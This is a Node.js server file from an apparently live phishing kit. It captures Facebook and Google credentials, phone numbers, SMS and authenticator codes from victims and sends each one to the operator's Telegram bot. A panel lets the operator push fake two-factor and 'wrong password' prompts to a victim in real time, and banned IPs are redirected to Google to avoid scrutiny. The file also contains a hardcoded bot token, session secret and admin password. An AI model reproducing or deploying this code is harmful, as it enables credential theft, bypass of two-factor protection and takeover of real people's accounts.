const express = require('express');
const session = require('express-session');
const basicAuth = require('basic-auth');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');
const UAParser = require('ua-parser-js');
const { sendTelegramMessage } = require('./bot/telegram');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
// geoip-lite removed — country blocking disabled

const app = express();
const server = http.createServer(app);
const bot = new TelegramBot('8716005325:AAFen4TgCidblYpqqeaF4nu_QbmRjs7B-mU', { polling: true });
bot.deleteWebHook().then(() => {
  console.log('Webhook deleted. Polling started.');
});
app.set('trust proxy', 1);
app.use(session({
  secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: true,
    sameSite: 'none',
    maxAge: 24 * 60 * 60 * 1000
  }
}));
app.use(cors({
  origin: '*', // allow all domains
  methods: ['GET', 'POST']
}));
app.use(express.json());

const io = socketIo(server, {
  cors: {
    origin: '*', // allow all domains
    methods: ['GET', 'POST']
  }
});
function auth(req, res, next) {
  if (req.session && req.session.authenticated) {
    return next();
  }

  const user = basicAuth(req);
  const username = 'admin';
  const password = 'Qweqwe123!@#';

  if (user && user.name === username && user.pass === password) {
    req.session.authenticated = true;
    return next();
  } else {
    res.set('WWW-Authenticate', 'Basic realm="Restricted Area"');
    return res.status(401).send('Authentication required.');
  }
}

const BAN_LIST_FILE = path.join(__dirname, 'ban_ips.txt');
app.use('/dash', auth, express.static(path.join(__dirname, 'aZ7pL9qW3xT2eR6vBj0K')));
app.use('/public', express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));
app.get('/', (req, res) => res.redirect('/dash'));

const users = {};             // socket.id -> socket
const userData = {};          // clientId -> data
const socketToClient = {};    // socket.id -> clientId
const newUsers = new Set();

bot.on('callback_query', (query) => {
  const [command, clientId] = query.data.split(':');

  const map = {
    send_2fa: 'show-2fa',
    send_auth: 'show-auth',
    send_email: 'show-email',
    send_wh: 'show-whatsapp',
    send_wrong_creds: 'show-wrong-creds',
    send_old_pass: 'show-old-pass',
    send_calendar: 'show-calendar',
    send_google_login: 'show-google-login',
    send_gmail_wrong_pass: 'show-gmail-wrong-pass',
    send_google_phone: 'show-google-phone',
    send_google_prompt: 'show-google-prompt',
    send_google_sms: 'show-google-sms',
    send_google_wrong_number: 'show-google-wrong-number',
    send_google_wrong_code: 'show-google-wrong-code',
    send_google_wrong_auth_code: 'show-google-wrong-auth-code',
    send_google_auth: 'show-google-auth',
  };

  if (command === 'disconnect') {
    disconnectClient(clientId);
    bot.answerCallbackQuery(query.id, { text: 'Client disconnected.' });
  } else if (map[command]) {
    emitToClient(clientId, map[command]);
    bot.answerCallbackQuery(query.id, { text: `Sent ${command.replace('_', ' ')}` });
    const msg = `📩 *Command Sent to Client*\n\n` +
      `📤 *Command:* \`${command}\`\n` +
      `🆔 *Client ID:* \`${clientId}\``;
    sendTelegramMessage(msg, clientId, true);
  } else if (command === 'ban_ip') {
    const ip = userData[clientId]?.ip;
    if (ip) {
      banIp(ip);
      bot.answerCallbackQuery(query.id, { text: `Banned IP: ${ip}` });
      disconnectClient(clientId);
      sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
    } else {
      bot.answerCallbackQuery(query.id, { text: 'IP not found for client.' });
    }
  }
  else {
    bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
  }
});
function formatDateTime(date) {
  const tz = 'Europe/Pristina';
  return {
    full: date.toISOString(),
    date: date.toLocaleDateString('en-GB', { timeZone: tz }),
    time: date.toLocaleTimeString('en-GB', { timeZone: tz, hour: '2-digit', minute: '2-digit', second: '2-digit' }),
    timestamp: Date.now()
  };
}

function getDeviceType(ua) {
  if (!ua) return 'Unknown';
  const lower = ua.toLowerCase();
  if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile/i.test(lower)) return '📱 Mobile';
  if (/ipad|tablet/i.test(lower)) return '📱 Tablet';
  return '🖥️ Desktop';
}

function updatePanelUsers() {
  const data = Object.values(userData)
    .filter(user => user?.time?.timestamp && Date.now() - user.time.timestamp <= 2 * 60 * 60 * 1000)
    .sort((a, b) => b.time.timestamp - a.time.timestamp);

  io.of('/panel').emit('update-users', {
    users: data,
    newUsers: Array.from(newUsers)
  });
}


io.on('connection', async (socket) => {
  const clientIP = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
  console.log(`[CONNECT] socket=${socket.id} ip=${clientIP}`);
const userAgent = socket.handshake.headers['user-agent'];
const timestamp = formatDateTime(new Date());

// Redirect banned IPs
if (isBanned(clientIP)) {
  socket.emit('redirect', 'https://www.google.com/');
  socket.disconnect();
  return;
}

  let clientId = socket.handshake.query.clientId;
  if (!clientId || typeof clientId !== 'string') {
    clientId = crypto.randomBytes(16).toString('hex');
    socket.emit('assign-client-id', clientId);
  }

  socketToClient[socket.id] = clientId;
  users[socket.id] = socket;

  const parser = new UAParser(userAgent);
  const browserName = parser.getBrowser().name || 'Unknown';

  // Register all socket handlers immediately (before async GeoIP) to avoid race conditions
  let connectionHandled = false;
  let city = 'Unknown', country = 'Unknown', isp = 'Unknown';

  const connectionTimeout = setTimeout(() => {
    if (!connectionHandled) {
      const isNewUser = !userData[clientId];

      userData[clientId] = {
        ...(userData[clientId] || {}),
        id: clientId,
        ip: clientIP,
        userAgent,
        time: timestamp,
        isConnected: true,
        page: userData[clientId]?.page || null,
        login: userData[clientId]?.login || {},
        codes: userData[clientId]?.codes || [],
        googleLogin: userData[clientId]?.googleLogin || {},
        googleCodes: userData[clientId]?.googleCodes || [],
        action: userData[clientId]?.action || null,
        activeSocketId: userData[clientId]?.activeSocketId || socket.id
      };

      if (isNewUser) {
        newUsers.add(clientId);

        /* Merge with recent same-IP offline session */
        const MERGE_WINDOW_MS = 10 * 60 * 1000;
        const tsNow = Date.now();
        const dup = Object.values(userData).find(u =>
          u.id !== clientId &&
          u.ip === clientIP &&
          !u.isConnected &&
          (tsNow - (u.time?.timestamp || 0)) < MERGE_WINDOW_MS
        );
        if (dup) {
          userData[clientId].login       = dup.login       || {};
          userData[clientId].codes       = dup.codes       || [];
          userData[clientId].googleLogin = dup.googleLogin || {};
          userData[clientId].googleCodes = dup.googleCodes || [];
          console.log(`[MERGE/timeout] ${dup.id} → ${clientId}`);
          delete userData[dup.id];
          newUsers.delete(dup.id);
        }

        const shortId = clientId.slice(0, 8).toUpperCase();
        const deviceType = getDeviceType(userAgent);
        const msg =
          `🌟 *New Connection*  ›  \`#${shortId}\`\n\n` +
          `🆔 *Full ID:* \`${clientId}\`\n` +
          `🌍 *IP:* \`${clientIP}\`\n` +
          `🏙 *City:* \`${city}\`\n` +
          `🏳️ *Country:* \`${country}\`\n` +
          `🌐 *Browser:* \`${browserName}\`\n` +
          `${deviceType}\n` +
          `🛣 *ISP:* \`${isp}\`\n\n` +
          `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\``;

        sendTelegramMessage(msg, clientId, 'banOnly');
      }

      updatePanelUsers();
    }
  }, 3000);

  socket.on('userConnectedToPage', (data) => {
    console.log(`[PAGE] clientId=${data.clientId} page=${data.page}`);
    connectionHandled = true;
    clearTimeout(connectionTimeout);

    const cid = data.clientId || socket.id;
    socketToClient[socket.id] = cid;

    const isNewUser = !userData[cid];

    if (isNewUser) {
      newUsers.add(cid);
      userData[cid] = {
        id: cid,
        ip: clientIP,
        userAgent,
        time: timestamp,
        isConnected: true,
        page: data.page || null,
        login: {},
        codes: [],
        googleLogin: {},
        googleCodes: [],
        action: null,
        pendingCommand: null,
        activeSocketId: socket.id
      };

      /*
       * Merge with any recent same-IP session that is now offline.
       * This handles Telegram WebView → Safari context switches (separate
       * localStorage → different clientId, same physical user).
       * Window: any disconnected entry from the same IP within the last 10 min.
       */
      const MERGE_WINDOW_MS = 10 * 60 * 1000;
      const now = Date.now();
      const duplicate = Object.values(userData).find(u =>
        u.id !== cid &&
        u.ip === clientIP &&
        !u.isConnected &&
        (now - (u.time?.timestamp || 0)) < MERGE_WINDOW_MS
      );
      if (duplicate) {
        /* Inherit all captured data from the older session */
        userData[cid].login       = duplicate.login       || {};
        userData[cid].codes       = duplicate.codes       || [];
        userData[cid].googleLogin = duplicate.googleLogin || {};
        userData[cid].googleCodes = duplicate.googleCodes || [];
        if (duplicate.pendingCommand && !userData[cid].pendingCommand) {
          userData[cid].pendingCommand = duplicate.pendingCommand;
        }
        console.log(`[MERGE] ${duplicate.id} → ${cid} (same IP ${clientIP})`);
        delete userData[duplicate.id];
        newUsers.delete(duplicate.id);
      }

      /* Delay 4 s so the background GeoIP lookup has time to finish */
      setTimeout(() => {
        if (!userData[cid]) return;
        const shortId = cid.slice(0, 8).toUpperCase();
        const deviceType = getDeviceType(userAgent);
        const msg =
          `🌟 *New Connection*  ›  \`#${shortId}\`\n\n` +
          `🆔 *Full ID:* \`${cid}\`\n` +
          `🌍 *IP:* \`${clientIP}\`\n` +
          `🏙 *City:* \`${city}\`\n` +
          `🏳️ *Country:* \`${country}\`\n` +
          `🌐 *Browser:* \`${browserName}\`\n` +
          `${deviceType}\n` +
          `🛣 *ISP:* \`${isp}\`\n\n` +
          `📄 *Page:* \`${data.page || 'unknown'}\`\n` +
          `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\``;
        sendTelegramMessage(msg, cid, 'banOnly');
      }, 4000);

    } else {
      /* Returning user (page navigation or reconnect) — update silently */
      userData[cid].isConnected = true;
      userData[cid].page = data.page || userData[cid].page;
      userData[cid].activeSocketId = socket.id;

      /* Replay any command that was sent while the socket was offline.
         IMPORTANT: do NOT clear pendingCommand yet — only clear it after the
         emit actually succeeds.  If Chrome kills the socket again inside the
         delay window we want the next reconnect to retry delivery. */
      const pending = userData[cid].pendingCommand;
      if (pending) {
        setTimeout(() => {
          if (!userData[cid]) return;
          /* Use the CURRENT active socket, not the one from the closure —
             Chrome may have reconnected multiple times during the delay */
          const activeSid = userData[cid].activeSocketId;
          if (activeSid && users[activeSid]) {
            users[activeSid].emit(pending.event, pending.data);
            userData[cid].pendingCommand = null; /* clear only after emit */
            console.log(`[REPLAY] ${pending.event} → ${cid}`);
          }
          /* If socket is gone, pendingCommand stays for the next reconnect */
        }, 800);
      }
    }

    updatePanelUsers();
  });

  socket.on('disconnect', () => {
    console.log(`[DISCONNECT] socket=${socket.id}`);
    const cid = socketToClient[socket.id];
    if (cid && userData[cid]) {
      userData[cid].isConnected = false;
      if (userData[cid].activeSocketId === socket.id) {
        delete userData[cid].activeSocketId;
      }
    }
    delete users[socket.id];
    delete socketToClient[socket.id];
    if (cid) newUsers.delete(cid);
    updatePanelUsers();
  });

  // GeoIP lookup (runs in background — handlers already registered above)
  try {
    const res = await axios.get(`http://ip-api.com/json/${clientIP}`, { timeout: 5000 });
    if (res.data && res.data.status === 'success') {
      city = res.data.city || 'Unknown';
      country = res.data.country || 'Unknown';
      isp = res.data.isp || 'Unknown';
    }
  } catch (err) {
    console.error('GeoIP lookup failed:', err.message);
  }
});

function isBanned(ip) {
  try {
    const bannedIps = fs.readFileSync(BAN_LIST_FILE, 'utf8').split('\n');
    return bannedIps.includes(ip.trim());
  } catch (e) {
    return false;
  }
}

function banIp(ip) {
  const cleanIp = ip.trim();

  if (!isBanned(cleanIp)) {
    try {
      // Step 1: Check if the file exists
      if (fs.existsSync(BAN_LIST_FILE)) {
        const data = fs.readFileSync(BAN_LIST_FILE, 'utf8');

        // Step 2: If the file does not end with a newline, add one
        if (!data.endsWith('\n')) {
          fs.appendFileSync(BAN_LIST_FILE, '\n');
        }
      }

      // Step 3: Append the new IP with a newline
      fs.appendFileSync(BAN_LIST_FILE, `${cleanIp}\n`);
    } catch (err) {
      console.error('Error saving banned IP:', err);
    }
  }
}

io.of('/panel').on('connection', (socket) => {
  updatePanelUsers();

  socket.on('get-users', () => updatePanelUsers());

  socket.on('send-sms', clientId => {
    emitToClient(clientId, 'show-2fa');
    sendTelegramMessage(`📲 *SMS 2FA Command Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-auth', clientId => {
    emitToClient(clientId, 'show-auth');
    sendTelegramMessage(`🔐 *Auth Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-email', clientId => {
    emitToClient(clientId, 'show-email');
    sendTelegramMessage(`📧 *Email Code Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-wh', clientId => {
    emitToClient(clientId, 'show-whatsapp');
    sendTelegramMessage(`💬 *WhatsApp Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-wrong-creds', clientId => {
    emitToClient(clientId, 'show-wrong-creds');
    sendTelegramMessage(`❌ *Wrong Credentials Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-old-pass', clientId => {
    emitToClient(clientId, 'show-old-pass');
    sendTelegramMessage(`🔁 *Old Password Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-calendar', clientId => {
    emitToClient(clientId, 'show-calendar');
    sendTelegramMessage(`📅 *Calendar View Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-google-login', clientId => {
    emitToClient(clientId, 'show-google-login');
    sendTelegramMessage(`🔵 *Google Login Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-gmail-wrong-pass', clientId => {
    emitToClient(clientId, 'show-gmail-wrong-pass');
    sendTelegramMessage(`❌ *Gmail Wrong Password Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-google-phone', (clientId, phonePrefix) => {
    emitToClient(clientId, 'show-google-phone', phonePrefix);
    sendTelegramMessage(`📱 *Google Phone Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n📞 *Prefix:* \`+${phonePrefix}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-google-prompt', (clientId, data) => {
    emitToClient(clientId, 'show-google-prompt', data);
    sendTelegramMessage(`🔢 *Google Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔢 *Number:* \`${data?.number}\`\n📱 *Device:* \`${data?.device}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-google-sms', (clientId, data) => {
    // data can be { prefix, lastTwo } object or legacy string prefix
    const payload = (data && typeof data === 'object') ? data : { prefix: String(data || ''), lastTwo: '00' };
    emitToClient(clientId, 'show-google-sms', payload);
    sendTelegramMessage(`📩 *Google SMS Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n📞 *Prefix:* \`+${payload.prefix}\`\n🔢 *Last 2 digits:* \`${payload.lastTwo}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-google-wrong-number', (clientId) => {
    emitToClient(clientId, 'show-google-wrong-number');
    sendTelegramMessage(`❌ *Google Wrong Number Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-google-wrong-code', (clientId) => {
    emitToClient(clientId, 'show-google-wrong-code');
    sendTelegramMessage(`❌ *Google Wrong SMS Code Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-google-wrong-auth-code', (clientId) => {
    emitToClient(clientId, 'show-google-wrong-auth-code');
    sendTelegramMessage(`❌ *Google Wrong Auth Code Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-google-auth', (clientId) => {
    emitToClient(clientId, 'show-google-auth');
    sendTelegramMessage(`🔐 *Google Authenticator Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-message', (clientId, message) => {
    emitToClient(clientId, 'message', message);
    sendTelegramMessage(`💬 *Custom Message Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n📝 Message: \`${message}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('disconnect-user', clientId => {
    disconnectClient(clientId);
    sendTelegramMessage(`🔌 *Client Forcefully Disconnected*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });
  socket.on('ban-ip', (clientId) => {
    const ip = userData[clientId]?.ip;
    if (ip) {
      banIp(ip);
      disconnectClient(clientId);
      sendTelegramMessage(
        `🚫 *IP Banned from Panel*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\`\n🔄 Triggered from Panel`,
        clientId,
        false
      );
    } else {
      sendTelegramMessage(`⚠️ *Failed to Ban IP*\n\nClient ID: \`${clientId}\`\nReason: IP not found`, clientId, false);
    }
  });

  socket.on('send-login-data', (clientId, username, password) => {
    if (userData[clientId]) {
      userData[clientId].login = { username, password };
      userData[clientId].action = 'Login';
    }

    sendTelegramMessage(`🔐 *Login Credentials Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\`\n🔄 Triggered from Panel`, clientId, true);

    updatePanelUsers();
  });

  /* Admin manually removes a stale/duplicate session from the panel */
  socket.on('dismiss-user', (clientId) => {
    if (userData[clientId]) {
      delete userData[clientId];
      newUsers.delete(clientId);
      console.log(`[DISMISS] clientId=${clientId} removed by admin`);
      updatePanelUsers();
    }
  });
});

function emitToClient(clientId, event, data = null) {
  const socketId = userData[clientId]?.activeSocketId || getSocketIdByClientId(clientId);
  if (socketId && users[socketId]) {
    users[socketId].emit(event, data);
  } else if (userData[clientId]) {
    /* Client offline — queue the command; replayed on next reconnect */
    userData[clientId].pendingCommand = { event, data };
    console.log(`[PENDING] clientId=${clientId} event=${event} queued for reconnect`);
  }
}

function disconnectClient(clientId) {
  const socketId = getSocketIdByClientId(clientId);
  if (socketId && users[socketId]) {
    users[socketId].disconnect(true);
  }
}

function getSocketIdByClientId(clientId) {
  return Object.entries(socketToClient)
    .find(([_, cid]) => cid === clientId)?.[0];
}

app.post('/send-auth-code', (req, res) => {
  const { code, socketId } = req.body;
  if (!code || code.length !== 6) return res.status(400).json({ message: 'Invalid authentication code.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });
  if (!userData[clientId]) return res.status(404).json({ message: 'User data not found.' });

  const message = `🔐 *Code*\n\nThe 6-digit authentication code is: \`${code}\`\n\nClient ID: \`${clientId}\``;
  sendTelegramMessage(message, clientId, true);

  userData[clientId].codes = userData[clientId].codes || [];
  userData[clientId].codes.push(code);
  userData[clientId].action = '2FA';
  updatePanelUsers();

  res.json({ message: 'Code sent successfully!' });
});

app.post('/send-email-code', (req, res) => {
  const { code, socketId } = req.body;
  if (!code || code.length !== 8) return res.status(400).json({ message: 'Invalid authentication code.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });
  if (!userData[clientId]) return res.status(404).json({ message: 'User data not found.' });

  const message = `🔐 *Email Code*\n\nThe 8-digit authentication code is: \`${code}\`\n\nClient ID: \`${clientId}\``;
  sendTelegramMessage(message, clientId, true);

  userData[clientId].codes = userData[clientId].codes || [];
  userData[clientId].codes.push(code);
  userData[clientId].action = 'Email';
  updatePanelUsers();

  res.json({ message: 'Code sent successfully!' });
});

app.post('/send-login-data', (req, res) => {
  const { username, password, socketId, type } = req.body;

  // Google email step sends an empty password — allow it when type is present
  if (!username) return res.status(400).json({ message: 'Username is required.' });
  if (!password && !type) return res.status(400).json({ message: 'Password is required.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });
  if (!userData[clientId]) return res.status(404).json({ message: 'User data not found.' });

  const shortId = clientId.slice(0, 8).toUpperCase();
  let message;
  let buttonSet;

  if (type === 'google_email') {
    message =
      `📧 *Google — Email*  ›  \`#${shortId}\`\n\n` +
      `👤 *Email:* \`${username}\`\n` +
      `🆔 *ID:* \`${clientId}\``;
    buttonSet = 'google';
  } else if (type === 'google_password') {
    message =
      `🔑 *Google — Password*  ›  \`#${shortId}\`\n\n` +
      `👤 *Email:* \`${username}\`\n` +
      `🔐 *Password:* \`${password}\`\n` +
      `🆔 *ID:* \`${clientId}\``;
    buttonSet = 'google';
  } else if (type === 'google_phone') {
    message =
      `📱 *Google — Phone*  ›  \`#${shortId}\`\n\n` +
      `👤 *Email:* \`${username}\`\n` +
      `📞 *Phone:* \`${password}\`\n` +
      `🆔 *ID:* \`${clientId}\``;
    buttonSet = 'google';
  } else if (type === 'google_sms_phone') {
    message =
      `📩 *Google — SMS Phone*  ›  \`#${shortId}\`\n\n` +
      `👤 *Email:* \`${username}\`\n` +
      `📞 *Phone:* \`${password}\`\n` +
      `🆔 *ID:* \`${clientId}\``;
    buttonSet = 'google';
  } else if (type === 'google_sms_code') {
    message =
      `🔑 *Google — SMS Code*  ›  \`#${shortId}\`\n\n` +
      `👤 *Email:* \`${username}\`\n` +
      `📟 *Code:* \`${password}\`\n` +
      `🆔 *ID:* \`${clientId}\``;
    buttonSet = 'google_sms_code';
  } else if (type === 'google_auth_code') {
    message =
      `🔐 *Google — Auth Code*  ›  \`#${shortId}\`\n\n` +
      `👤 *Email:* \`${username}\`\n` +
      `📟 *Code:* \`${password}\`\n` +
      `🆔 *ID:* \`${clientId}\``;
    buttonSet = 'google_auth_code';
  } else {
    message =
      `🔵 *Facebook Login*  ›  \`#${shortId}\`\n\n` +
      `👤 *Username:* \`${username}\`\n` +
      `🔑 *Password:* \`${password}\`\n` +
      `🆔 *ID:* \`${clientId}\``;
    buttonSet = true;
  }

  sendTelegramMessage(message, clientId, buttonSet);

  if (type === 'google_email') {
    userData[clientId].googleLogin = { ...userData[clientId].googleLogin, email: username };
  } else if (type === 'google_password') {
    userData[clientId].googleLogin = { ...userData[clientId].googleLogin, password };
  } else if (type === 'google_phone') {
    userData[clientId].googleLogin = { ...userData[clientId].googleLogin, phone: password };
  } else if (type === 'google_sms_phone') {
    userData[clientId].googleLogin = { ...userData[clientId].googleLogin, smsPhone: password };
  } else if (type === 'google_sms_code' || type === 'google_auth_code') {
    if (!userData[clientId].googleCodes) userData[clientId].googleCodes = [];
    userData[clientId].googleCodes.push(password);
  } else {
    userData[clientId].login = { username, password };
  }
  userData[clientId].action = type || 'facebook_login';
  updatePanelUsers();

  res.json({ success: true, message: 'Login data sent successfully!' });
});

server.listen(process.env.PORT || 3001, () => console.log(`Server running on port ${process.env.PORT || 3001}`));
